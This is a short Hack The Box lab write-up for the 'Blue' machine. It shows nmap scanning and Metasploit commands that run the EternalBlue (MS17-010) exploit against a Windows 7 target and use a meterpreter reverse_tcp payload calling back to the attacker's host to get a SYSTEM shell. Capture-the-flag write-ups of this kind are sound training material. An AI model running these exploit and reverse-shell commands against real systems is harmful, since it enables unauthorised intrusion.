# Blue – Hack The Box Writeup

## Target Info
- IP: 10.129.202.127
- OS: Windows 7 SP1

## 🎯 Goal
Gain NT AUTHORITY\SYSTEM access using the EternalBlue exploit (MS17-010)

## Enumeration:

### Nmap Scan
```bash
nmap -sV -O -oN blue-nmap.txt 10.129.202.127
```
Found open ports : 135,139,445 
OS Fingerprint : Windows 7 SP1
Suspected vulnerabilities: SMB Eternal blue exploit

## Exploitation – MS17-010 (EternalBlue)

### Vulnerability Confirmation
Ran an Nmap vulnerability scan to confirm SMB vulnerability:

```bash
nmap -p445 --script smb-vuln-ms17-010 10.129.202.127
```
afterwards I ran msfconsole and search for module eternalblue
I used this one:
```bash 
use exploit/windows/smb/ms17_010_eternalblue
```
I set the RHOST and the LHOST  set the payload acordinly shown below:
```bash 
set RHOSTS 10.129.202.127
set LHOST 10.10.14.77
set payload windows/x64/meterpreter/reverse_tcp
run
```
Which gave me a reverse shell with meterpreter which then I ran getuid and the results are as follows:

Server username: NT AUTHORITY\SYSTEM

This means no need for privilage escalation methods

## Flags Captured

-  User Flag: **447c.....<REDACTED>**
-  System Flag: **5478....<REDACTED>**

> > Flags were captured successfully and partially shown here for proof of access. Redacted due to HTB rules. 
